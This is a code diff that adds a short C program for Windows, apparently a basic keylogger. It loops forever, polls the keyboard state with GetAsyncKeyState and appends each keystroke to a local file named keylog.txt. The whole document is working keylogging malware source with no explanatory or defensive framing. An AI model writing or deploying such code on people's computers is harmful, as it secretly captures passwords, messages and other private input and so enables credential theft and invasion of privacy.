@@ -1,0 +1,28 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <winuser.h>
+
+int main() {
+    FILE *fp;
+    int key;
+    fp = fopen("keylog.txt", "a");
+
+    while (1) {
+        for (key = 8; key <= 222; key++) {
+            if (GetAsyncKeyState(key) == -32767) {
+                if (key == VK_RETURN)
+                    fprintf(fp, "\n");
+                else if (key == VK_SPACE)
+                    fprintf(fp, " ");
+                else {
+                    fprintf(fp, "%c", key);
+                }
+                fflush(fp);
+            }
+        }
+    }
+
+    fclose(fp);
+    return 0;
+}
